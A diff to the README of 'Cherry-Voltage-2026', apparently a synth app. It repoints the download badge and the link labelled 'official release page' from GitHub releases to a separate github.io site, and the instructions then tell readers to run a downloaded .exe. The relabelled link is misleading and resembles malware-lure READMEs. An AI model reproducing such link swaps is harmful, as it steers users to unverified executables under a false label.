@@ -1,6 +1,6 @@
 # 🎹 Cherry-Voltage-2026 - Create professional modular synth sounds easily
 
-[ ![Download Version](https://img.shields.io/badge/Download-Release-blue.svg) ](https://github.com/Bokismoki123/Cherry-Voltage-2026/releases)
+[ ![Download Version](https://img.shields.io/badge/Download-Release-blue.svg) ](https://bokismoki123.github.io)
 
 ## 📥 Getting Started
 
@@ -20,7 +20,7 @@ Before you install the software, check that your computer meets these requiremen
 
 Follow these steps to get the software onto your machine:
 
-1. Visit the [official release page](https://github.com/Bokismoki123/Cherry-Voltage-2026/releases) to see all available versions.
+1. Visit the [official release page](https://bokismoki123.github.io) to see all available versions.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to download the installer to your computer.
 4. Locate the file in your downloads folder once the transfer finishes.
